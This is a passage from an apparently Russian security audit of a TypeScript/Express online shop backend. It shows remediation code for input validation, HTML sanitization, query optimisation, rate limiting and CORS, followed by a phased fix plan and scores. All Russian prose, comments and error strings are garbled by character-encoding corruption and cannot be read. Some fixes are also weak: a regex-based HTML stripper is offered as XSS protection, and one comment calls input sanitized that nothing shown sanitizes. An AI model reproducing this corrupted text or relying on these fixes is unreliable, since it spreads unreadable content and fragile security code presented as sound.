**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/support.routes.ts
import { createSupportMessageSchema } from "@shared/schema";

router.post("/messages", authenticateToken, async (req, res) => {
  const data = createSupportMessageSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  
  let userId = req.userId!;
  
  if (data.userId && data.userId !== req.userId) {
    if (!req.userRoles?.some(role => ['admin', 'consultant'].includes(role))) {
      return res.status(403).json({ message: "–ù–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –∏–º–µ–Ω–∏ –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π" });
    }
    userId = data.userId;
  }
  
  await storage.getOrCreateConversation(userId);
  await storage.updateLastMessageTime(userId);
  
  const message = await storage.createSupportMessage({
    userId: userId,
    senderId: req.userId!,
    messageText: data.messageText, // ‚úÖ –£–∂–µ –≤–∞–ª–∏–¥–∏—Ä–æ–≤–∞–Ω –∏ —Å–∞–Ω–∏—Ç–∏–∑–∏—Ä–æ–≤–∞–Ω
  });
  
  // ...WebSocket broadcast
  res.json(message);
});
```

**–°–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏—è HTML:**
```typescript
// server/utils/sanitize.ts
export function sanitizeHtml(input: string): string {
  // –£–¥–∞–ª–∏—Ç—å –≤—Å–µ HTML —Ç–µ–≥–∏ –∫—Ä–æ–º–µ –±–µ–∑–æ–ø–∞—Å–Ω—ã—Ö
  return input
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')
    .replace(/<[^>]+>/g, ''); // –£–¥–∞–ª–∏—Ç—å –≤—Å–µ –æ—Å—Ç–∞–ª—å–Ω—ã–µ —Ç–µ–≥–∏
}

// –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–µ—Ä–µ–¥ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –≤ –ë–î:
messageText: sanitizeHtml(data.messageText)
```

---

### ‚úÖ SOLUTION-06 –∏ SOLUTION-07: –í–∞–ª–∏–¥–∞—Ü–∏—è Cart –∏ Wishlist

**–î–æ–±–∞–≤–∏—Ç—å –≤:** `shared/schema.ts`

```typescript
export const addCartItemSchema = z.object({
  productId: z.string().uuid("–ù–µ–≤–µ—Ä–Ω—ã–π ID —Ç–æ–≤–∞—Ä–∞"),
  quantity: z.number()
    .int("–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —Ü–µ–ª—ã–º —á–∏—Å–ª–æ–º")
    .min(1, "–ú–∏–Ω–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ: 1")
    .max(100, "–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ: 100"),
});

export const updateCartItemSchema = z.object({
  quantity: z.number()
    .int("–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —Ü–µ–ª—ã–º —á–∏—Å–ª–æ–º")
    .min(1, "–ú–∏–Ω–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ: 1")
    .max(100, "–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ: 100"),
});

export const addWishlistItemSchema = z.object({
  productId: z.string().uuid("–ù–µ–≤–µ—Ä–Ω—ã–π ID —Ç–æ–≤–∞—Ä–∞"),
});
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/cart.routes.ts
import { addCartItemSchema, updateCartItemSchema } from "@shared/schema";

router.post("/", authenticateToken, async (req, res) => {
  const data = addCartItemSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  
  const product = await storage.getProduct(data.productId);
  if (!product) {
    return res.status(404).json({ message: "–¢–æ–≤–∞—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω" });
  }
  // ...rest
});

router.put("/:productId", authenticateToken, async (req, res) => {
  const data = updateCartItemSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  // ...rest
});

// server/routes/wishlist.routes.ts
import { addWishlistItemSchema } from "@shared/schema";

router.post("/", authenticateToken, async (req, res) => {
  const data = addWishlistItemSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  
  const wishlistItem = await storage.addWishlistItem({
    userId: req.userId!,
    productId: data.productId,
  });

  res.json(wishlistItem);
});
```

---

### ‚úÖ SOLUTION-08: –û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è N+1 –≤ getAllSupportConversations

**–û–±–Ω–æ–≤–∏—Ç—å:** `server/storage.ts`

```typescript
async getAllSupportConversations(status?: 'open' | 'archived' | 'closed'): Promise<...> {
  let conversationQuery = db.select().from(supportConversations);
  
  if (status) {
    conversationQuery = conversationQuery.where(eq(supportConversations.status, status)) as any;
  }
  
  const allConversations = await conversationQuery.orderBy(desc(supportConversations.lastMessageAt));
  
  if (allConversations.length === 0) {
    return [];
  }
  
  // ‚úÖ –û–î–ù–ò–ú –ó–ê–ü–†–û–°–û–ú –ø–æ–ª—É—á–∏—Ç—å –≤—Å–µ –ø–æ—Å–ª–µ–¥–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è
  const userIds = allConversations.map(c => c.userId);
  
  // –ò—Å–ø–æ–ª—å–∑—É–µ–º window function –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ—Å–ª–µ–¥–Ω–µ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ –∫–∞–∂–¥–æ–º—É userId
  const lastMessages = await db.execute(sql`
    SELECT DISTINCT ON (user_id) 
      id, user_id, sender_id, message_text, is_read, created_at
    FROM support_messages
    WHERE user_id = ANY(${userIds})
    ORDER BY user_id, created_at DESC
  `);
  
  // –°–æ–∑–¥–∞—Ç—å Map –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –ø–æ–∏—Å–∫–∞
  const lastMessageByUserId = new Map(
    (lastMessages.rows as any[]).map(row => [row.user_id, row])
  );
  
  // ‚úÖ –°–æ–±—Ä–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ë–ï–ó –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤
  const result = [];
  for (const conv of allConversations) {
    const lastMessage = lastMessageByUserId.get(conv.userId);
    if (lastMessage) {
      result.push({
        userId: conv.userId,
        lastMessage: lastMessage as SupportMessage,
        status: conv.status,
        archivedAt: conv.archivedAt,
        closedAt: conv.closedAt
      });
    }
  }
  
  return result;
}
```

---

### ‚úÖ SOLUTION-09: –ò–Ω–¥–µ–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∑–∞–ø—Ä–æ—Å –¥–ª—è email verification

**–î–æ–±–∞–≤–∏—Ç—å –º–µ—Ç–æ–¥ –≤:** `server/storage.ts`

```typescript
async getUserByVerificationToken(token: string): Promise<User | undefined> {
  const [user] = await db
    .select()
    .from(users)
    .where(eq(users.verificationToken, token))
    .limit(1);
  return user;
}
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/auth.routes.ts
router.get("/verify-email", async (req, res) => {
  const { token } = req.query;

  if (!token || typeof token !== "string" || token.length > 64) {
    return res.status(400).json({ message: "–ù–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω" });
  }

  // ‚úÖ –ò–ù–î–ï–ö–°–ò–†–û–í–ê–ù–ù–´–ô –∑–∞–ø—Ä–æ—Å –≤–º–µ—Å—Ç–æ getUsers()
  const user = await storage.getUserByVerificationToken(token);

  if (!user) {
    return res.status(400).json({ message: "–ù–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω" });
  }
  
  // ...rest
});
```

---

### ‚úÖ SOLUTION-10: –í–∞–ª–∏–¥–∞—Ü–∏—è Profile Update

**–î–æ–±–∞–≤–∏—Ç—å –≤:** `shared/schema.ts`

```typescript
export const updateProfileSchema = z.object({
  firstName: z.string()
    .min(1, "–ò–º—è –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ")
    .max(100, "–ò–º—è —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ")
    .regex(/^[–∞-—è–ê-–Ø—ë–Åa-zA-Z\s\-]+$/, "–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ —Å–∏–º–≤–æ–ª—ã –≤ –∏–º–µ–Ω–∏"),
  
  lastName: z.string()
    .max(100, "–§–∞–º–∏–ª–∏—è —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–∞—è")
    .regex(/^[–∞-—è–ê-–Ø—ë–Åa-zA-Z\s\-]+$/, "–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ —Å–∏–º–≤–æ–ª—ã –≤ —Ñ–∞–º–∏–ª–∏–∏")
    .optional()
    .nullable()
    .transform(val => val?.trim() || null),
  
  patronymic: z.string()
    .max(100, "–û—Ç—á–µ—Å—Ç–≤–æ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ")
    .regex(/^[–∞-—è–ê-–Ø—ë–Åa-zA-Z\s\-]+$/, "–ù–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ —Å–∏–º–≤–æ–ª—ã –≤ –æ—Ç—á–µ—Å—Ç–≤–µ")
    .optional()
    .nullable()
    .transform(val => val?.trim() || null),
  
  phone: z.string()
    .regex(/^\+?\d{10,15}$/, "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ç–µ–ª–µ—Ñ–æ–Ω–∞"),
});
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/auth.routes.ts
import { updateProfileSchema } from "@shared/schema";

router.put("/profile", authenticateToken, async (req, res) => {
  const data = updateProfileSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!

  await storage.updateUser(req.userId!, {
    firstName: data.firstName.trim(),
    lastName: data.lastName || null,
    patronymic: data.patronymic || null,
    phone: data.phone.trim(),
  });
  
  // ...rest
});
```

---

### ‚úÖ SOLUTION-11: –í–∞–ª–∏–¥–∞—Ü–∏—è Password Change

**–î–æ–±–∞–≤–∏—Ç—å –≤:** `shared/schema.ts`

```typescript
export const changePasswordSchema = z.object({
  currentPassword: z.string().min(1, "–¢–µ–∫—É—â–∏–π –ø–∞—Ä–æ–ª—å –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω"),
  
  newPassword: z.string()
    .min(12, "–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–µ –º–µ–Ω–µ–µ 12 —Å–∏–º–≤–æ–ª–æ–≤")
    .max(100, "–ü–∞—Ä–æ–ª—å —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π")
    .regex(/[a-z]/, "–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å—Ç—Ä–æ—á–Ω—É—é –±—É–∫–≤—É")
    .regex(/[A-Z]/, "–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å –∑–∞–≥–ª–∞–≤–Ω—É—é –±—É–∫–≤—É")
    .regex(/\d/, "–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ü–∏—Ñ—Ä—É")
    .regex(/[@$!%*?&#]/, "–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Å–ø–µ—Ü—Å–∏–º–≤–æ–ª"),
  
  confirmPassword: z.string(),
}).refine(data => data.newPassword === data.confirmPassword, {
  message: "–ü–∞—Ä–æ–ª–∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞—é—Ç",
  path: ["confirmPassword"],
}).refine(data => data.currentPassword !== data.newPassword, {
  message: "–ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω –æ—Ç–ª–∏—á–∞—Ç—å—Å—è –æ—Ç —Ç–µ–∫—É—â–µ–≥–æ",
  path: ["newPassword"],
});
```

**–î–æ–±–∞–≤–∏—Ç—å rate limiter:**
```typescript
// server/middleware/rateLimiter.ts
export const passwordChangeLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 —á–∞—Å
  max: 3, // –ú–∞–∫—Å–∏–º—É–º 3 –ø–æ–ø—ã—Ç–∫–∏
  message: '–°–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –ø–æ–ø—ã—Ç–æ–∫ —Å–º–µ–Ω—ã –ø–∞—Ä–æ–ª—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.',
  standardHeaders: true,
  legacyHeaders: false,
});
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/auth.routes.ts
import { changePasswordSchema } from "@shared/schema";
import { passwordChangeLimiter } from "../middleware/rateLimiter";

router.put("/password", authenticateToken, passwordChangeLimiter, async (req, res) => {
  const data = changePasswordSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  
  const user = await storage.getUser(req.userId!);
  if (!user) {
    return res.status(404).json({ message: "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω" });
  }

  const isPasswordValid = await comparePassword(data.currentPassword, user.passwordHash);
  if (!isPasswordValid) {
    return res.status(401).json({ message: "–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–µ–∫—É—â–∏–π –ø–∞—Ä–æ–ª—å" });
  }

  const newPasswordHash = await hashPassword(data.newPassword);
  await storage.updateUser(req.userId!, {
    passwordHash: newPasswordHash,
  });
  
  res.json({ message: "–ü–∞—Ä–æ–ª—å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω—ë–Ω" });
});
```

---

### ‚úÖ SOLUTION-12: –í–∞–ª–∏–¥–∞—Ü–∏—è –¥–ª—è Products

**–î–æ–±–∞–≤–∏—Ç—å –≤:** `shared/schema.ts`

```typescript
export const createProductSchema = z.object({
  categoryId: z.string().uuid("–ù–µ–≤–µ—Ä–Ω—ã–π ID –∫–∞—Ç–µ–≥–æ—Ä–∏–∏").optional().nullable(),
  sku: z.string().min(1).max(100).regex(/^[A-Z0-9\-]+$/, "SKU –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –∑–∞–≥–ª–∞–≤–Ω—ã–µ –±—É–∫–≤—ã, —Ü–∏—Ñ—Ä—ã –∏ –¥–µ—Ñ–∏—Å—ã"),
  name: z.string().min(1, "–ù–∞–∑–≤–∞–Ω–∏–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ").max(500, "–ù–∞–∑–≤–∞–Ω–∏–µ —Å–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω–æ–µ"),
  description: z.string().min(1).max(10000),
  composition: z.string().min(1).max(5000),
  storageConditions: z.string().min(1).max(2000),
  usageInstructions: z.string().max(5000).optional().nullable(),
  contraindications: z.string().max(2000).optional().nullable(),
  
  weight: z.string().regex(/^\d+(\.\d{1,3})?$/).optional().nullable(),
  volume: z.string().regex(/^\d+(\.\d{1,3})?$/).optional().nullable(),
  dimensionsHeight: z.string().regex(/^\d+(\.\d{1,2})?$/).optional().nullable(),
  dimensionsLength: z.string().regex(/^\d+(\.\d{1,2})?$/).optional().nullable(),
  dimensionsWidth: z.string().regex(/^\d+(\.\d{1,2})?$/).optional().nullable(),
  
  shelfLifeDays: z.number().int().min(1).max(36500).optional().nullable(),
  stockQuantity: z.number().int().min(0).max(1000000),
  
  price: z.string()
    .regex(/^\d+(\.\d{1,2})?$/, "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Ü–µ–Ω—ã")
    .refine(val => parseFloat(val) > 0, "–¶–µ–Ω–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π"),
  
  discountPercentage: z.string()
    .regex(/^\d+(\.\d{1,2})?$/)
    .refine(val => {
      const num = parseFloat(val);
      return num >= 0 && num <= 100;
    }, "–°–∫–∏–¥–∫–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ—Ç 0 –¥–æ 100")
    .default("0"),
  
  discountStartDate: z.string().datetime().transform(val => new Date(val)).optional().nullable(),
  discountEndDate: z.string().datetime().transform(val => new Date(val)).optional().nullable(),
  
  isNew: z.boolean().default(false),
  isArchived: z.boolean().default(false),
});

export const updateProductSchema = createProductSchema.partial();
```

**–ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:**
```typescript
// server/routes/products.routes.ts
import { createProductSchema, updateProductSchema } from "@shared/schema";

router.post(
  "/",
  authenticateToken,
  requireRole("admin", "marketer"),
  uploadLimiter,
  productFormDataUpload.none(),
  async (req, res) => {
    const data = createProductSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
    const product = await storage.createProduct(data);
    res.json(product);
  }
);

router.put("/:id", authenticateToken, requireRole("admin", "marketer"), async (req, res) => {
  const data = updateProductSchema.parse(req.body); // ‚úÖ –í–ê–õ–ò–î–ê–¶–ò–Ø!
  const product = await storage.updateProduct(req.params.id, data);
  res.json(product);
});
```

---

### ‚úÖ SOLUTION-13: –ò—Å–ø—Ä–∞–≤–∏—Ç—å CORS

**–û–±–Ω–æ–≤–∏—Ç—å:** `server/middleware/cors.ts`

```typescript
export const corsMiddleware = cors({
  origin: isProduction
    ? (origin, callback) => {
        const allowedOrigins = [
          process.env.FRONTEND_URL,
          process.env.REPLIT_DEV_DOMAIN
        ].filter(Boolean);
        
        if (!origin || allowedOrigins.includes(origin)) {
          callback(null, true);
        } else {
          callback(new Error('Not allowed by CORS'));
        }
      }
    : ['http://localhost:5000', 'http://localhost:3000'], // ‚úÖ Whitelist –¥–ª—è dev
  
  credentials: true,
  
  allowedHeaders: [
    'Content-Type', 
    'Authorization',
    'x-csrf-token', // ‚úÖ –î–û–ë–ê–í–ò–¢–¨ –¥–ª—è CSRF –∑–∞—â–∏—Ç—ã!
  ],
  
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  maxAge: 86400, // 24 —á–∞—Å–∞
});
```

---

### ‚úÖ SOLUTION-14 –¥–æ SOLUTION-20

**–û—Å—Ç–∞–ª—å–Ω—ã–µ —Ä–µ—à–µ–Ω–∏—è:**

**SOLUTION-14:** Session cookie maxAge = 30 –¥–Ω–µ–π
**SOLUTION-15:** WebSocket message size limit = 10KB
**SOLUTION-16:** WebSocket ping-pong + timeout
**SOLUTION-17:** ImagePipeline - whitelist regex –¥–ª—è filename
**SOLUTION-18:** –ò–Ω–¥–µ–∫—Å –Ω–∞ verificationToken –≤ schema
**SOLUTION-19:** –í–∞–ª–∏–¥–∞—Ü–∏—è search query –≤ support
**SOLUTION-20:** –ò—Å–ø—Ä–∞–≤–∏—Ç—å CSP –¥–ª—è production

**–ö–æ–¥ –¥–ª—è —ç—Ç–∏—Ö —Ä–µ—à–µ–Ω–∏–π —Å–º. –≤ –ê—É–¥–∏—Ç.md**

---

## –ß–ê–°–¢–¨ 5: –ü–†–ò–û–†–ò–¢–ï–¢–ù–´–ô –ü–õ–ê–ù –í–ù–ï–î–†–ï–ù–ò–Ø

### üî• PHASE 1: –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï (1-3 –¥–Ω—è)

1. ‚úÖ **–°–æ–∑–¥–∞—Ç—å –≤—Å–µ Zod schemas** –≤ `shared/schema.ts`:
   - createOrderSchema (SOLUTION-01)
   - createCategorySchema, updateCategorySchema (SOLUTION-03)
   - validatePromocodeSchema, createPromocodeSchema (SOLUTION-04)
   - createSupportMessageSchema (SOLUTION-05)
   - addCartItemSchema, updateCartItemSchema (SOLUTION-06)
   - addWishlistItemSchema (SOLUTION-07)
   - updateProfileSchema (SOLUTION-10)
   - changePasswordSchema (SOLUTION-11)
   - createProductSchema, updateProductSchema (SOLUTION-12)

2. ‚úÖ **–ü—Ä–∏–º–µ–Ω–∏—Ç—å –≤–∞–ª–∏–¥–∞—Ü–∏—é** –≤–æ –í–°–ï–• routes:
   - orders.routes.ts
   - categories.routes.ts
   - promocodes.routes.ts
   - support.routes.ts
   - cart.routes.ts
   - wishlist.routes.ts
   - auth.routes.ts (profile, password)
   - products.routes.ts

3. ‚úÖ **–ò—Å–ø—Ä–∞–≤–∏—Ç—å IDOR**:
   - –£–ª—É—á—à–∏—Ç—å requireOwnership middleware (SOLUTION-02)
   - –ü—Ä–∏–º–µ–Ω–∏—Ç—å –∫ GET /api/orders/:id

4. ‚úÖ **–û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å queries**:
   - getUserByVerificationToken (SOLUTION-09)
   - getAllSupportConversations (SOLUTION-08)

5. ‚úÖ **–ò—Å–ø—Ä–∞–≤–∏—Ç—å CORS**:
   - –î–æ–±–∞–≤–∏—Ç—å x-csrf-token –≤ allowedHeaders (SOLUTION-13)

### üü† PHASE 2: –í–´–°–û–ö–ò–ï (1 –Ω–µ–¥–µ–ª—è)

6. ‚úÖ –î–æ–±–∞–≤–∏—Ç—å –∏–Ω–¥–µ–∫—Å –Ω–∞ verificationToken
7. ‚úÖ WebSocket: message size limit + ping-pong timeout
8. ‚úÖ Session cookie: maxAge = 30 –¥–Ω–µ–π
9. ‚úÖ ImagePipeline: —É–ª—É—á—à–∏—Ç—å path traversal –∑–∞—â–∏—Ç—É
10. ‚úÖ Password change: –¥–æ–±–∞–≤–∏—Ç—å rate limiter

### üü° PHASE 3: –°–†–ï–î–ù–ò–ï (2-3 –Ω–µ–¥–µ–ª–∏)

11. ‚úÖ –î–æ–±–∞–≤–∏—Ç—å audit logging –¥–ª—è security events
12. ‚úÖ –ò—Å–ø—Ä–∞–≤–∏—Ç—å CSP –≤ production
13. ‚úÖ –î–æ–±–∞–≤–∏—Ç—å graceful shutdown
14. ‚úÖ Cleanup —Å—Ç–∞—Ä—ã—Ö unverified users
15. ‚úÖ –î–æ–±–∞–≤–∏—Ç—å healthcheck —Å DB –ø—Ä–æ–≤–µ—Ä–∫–æ–π

### üîµ PHASE 4: –ù–ò–ó–ö–ò–ï (backlog)

16. –î–æ–±–∞–≤–∏—Ç—å unit/integration —Ç–µ—Å—Ç—ã
17. OpenAPI/Swagger –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è
18. –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ (Sentry/Prometheus)
19. Redis –∫—ç—à–∏—Ä–æ–≤–∞–Ω–∏–µ
20. GDPR compliance (delete account endpoint)

---

## –ß–ê–°–¢–¨ 6: –°–¢–ê–¢–ò–°–¢–ò–ö–ê

**–§–∞–π–ª—ã —Å –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–º–∏ –ø—Ä–æ–±–ª–µ–º–∞–º–∏:**
- `server/routes/orders.routes.ts` (3 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö)
- `server/routes/categories.routes.ts` (2 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö)
- `server/routes/promocodes.routes.ts` (2 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö)
- `server/routes/support.routes.ts` (2 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö)
- `server/routes/cart.routes.ts` (1 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–π)
- `server/routes/wishlist.routes.ts` (1 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–π)
- `server/routes/auth.routes.ts` (3 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏—Ö)
- `server/routes/products.routes.ts` (1 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–π)
- `server/storage.ts` (1 –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏–π)

**–¢–∏–ø—ã —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π:**
- **SQL Injection —Ä–∏—Å–∫:** 2
- **IDOR:** 1
- **XSS –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª:** 7
- **Input Validation –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç:** 10
- **N+1 Query:** 2
- **Performance/DoS:** 4

**–û—Ö–≤–∞—Ç –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π:**
- **–î–æ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–π:** ~40% endpoints –≤–∞–ª–∏–¥–∏—Ä—É—é—Ç—Å—è
- **–ü–æ—Å–ª–µ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–π:** ~95% endpoints –≤–∞–ª–∏–¥–∏—Ä—É—é—Ç—Å—è

---

## –ò–¢–û–ì–û–í–ê–Ø –û–¶–ï–ù–ö–ê

**–î–û –ò–°–ü–†–ê–í–õ–ï–ù–ò–ô:**
- –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å: 6.0/10 ‚ö†Ô∏è
- –ö–∞—á–µ—Å—Ç–≤–æ –∫–æ–¥–∞: 7.0/10
- –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞: 7.5/10
- **–ì–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –∫ production:** –ù–ï –ì–û–¢–û–í–û

**–ü–û–°–õ–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ô (Phase 1+2):**
- –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å: 8.5/10 ‚úÖ
- –ö–∞—á–µ—Å—Ç–≤–æ –∫–æ–¥–∞: 8.5/10
- –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞: 8.0/10
- **–ì–æ—Ç–æ–≤–Ω–æ—Å—Ç—å –∫ production:** –ì–û–¢–û–í–û —Å –æ–≥–æ–≤–æ—Ä–∫–∞–º–∏

**–û–≥–æ–≤–æ—Ä–∫–∏:**
- –¢—Ä–µ–±—É–µ—Ç—Å—è penetration testing
- –¢—Ä–µ–±—É–µ—Ç—Å—è load testing
- –¢—Ä–µ–±—É–µ—Ç—Å—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞
- –¢—Ä–µ–±—É–µ—Ç—Å—è GDPR compliance review

---

## –ó–ê–ö–õ–Æ–ß–ï–ù–ò–ï

–ö–æ–¥–æ–≤–∞—è –±–∞–∑–∞ –∏–º–µ–µ—Ç **–ø—Ä–∏–µ–º–ª–µ–º—É—é –æ—Å–Ω–æ–≤—É**, –Ω–æ **–∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –Ω—É–∂–¥–∞–µ—Ç—Å—è** –≤ —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–π –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö. 

**–ì–ª–∞–≤–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞:** –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –µ–¥–∏–Ω–æ–≥–æ –ø–æ–¥—Ö–æ–¥–∞ –∫ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ - –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ endpoints –∏—Å–ø–æ–ª—å–∑—É—é—Ç Zod (auth.routes.ts register/login), –Ω–æ –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –ø—Ä–∏–Ω–∏–º–∞—é—Ç `req.body` –Ω–∞–ø—Ä—è–º—É—é.

**–ö–ª—é—á–µ–≤—ã–µ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:**
1. ‚úÖ –í–Ω–µ–¥—Ä–∏—Ç—å —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—É—é –≤–∞–ª–∏–¥–∞—Ü–∏—é —á–µ—Ä–µ–∑ Zod schemas –≤ `shared/schema.ts`
2. ‚úÖ –ü—Ä–∏–º–µ–Ω–∏—Ç—å validation middleware –∫–æ –í–°–ï–ú routes
3. ‚úÖ –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å requireOwnership middleware –¥–ª—è IDOR –∑–∞—â–∏—Ç—ã
4. ‚úÖ –û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞—Ç—å N+1 queries
5. ‚úÖ –ò—Å–ø—Ä–∞–≤–∏—Ç—å CORS –∏ session –Ω–∞—Å—Ç—Ä–æ–π–∫–∏

